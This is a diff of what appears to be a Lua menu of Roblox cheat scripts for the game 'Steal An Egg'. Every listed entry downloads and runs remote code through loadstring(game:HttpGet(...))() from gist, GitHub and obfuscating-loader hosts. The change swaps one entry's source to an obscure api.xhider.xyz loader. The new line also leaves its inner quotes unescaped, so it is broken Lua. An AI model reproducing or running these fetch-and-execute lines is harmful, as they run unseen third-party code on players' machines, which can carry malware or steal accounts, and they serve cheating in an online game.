@@ -59,7 +59,7 @@ local WA_CHANNEL_LINK = "https://whatsapp.com/channel/0029VbDq74VHgZWbi0AdSa1L"
 
 -- [ 3. DATA KATEGORI & DAFTAR SCRIPT ]
 local RawScriptDataStealAnEgg = {
-    {"SOURCES HUB","No Key",true,"loadstring(game:HttpGet(\"https://gist.githubusercontent.com/sourceshubs/defcec9157a975abded71f190593ebce/raw/SourcesHubStealAnEggAllNew\"))()"},
+    {"SOURCES HUB","No Key",true,"loadstring(game:HttpGet("https://api.xhider.xyz/files/v4/loaders/272e1920f269e8e13ebed2730dedd08a.lua"))()"},
     {"DHII'S HUB","No Key",true,"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/dhiisepertiorang/dhii_kick.lua/refs/heads/main/dhiitoaa.lua\"))()"},
     {"Lych x putra hub","No Key",true,"loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Nillapesr/sc/refs/heads/main/LycheHub.lua\"))()"},
     {"VIREX HUB","No Key",true,"loadstring(game:HttpGet(\"https://cdn.luaprotect.dev/u/8660b0/AvrC3cs5mZ38jbnD\"))()"},
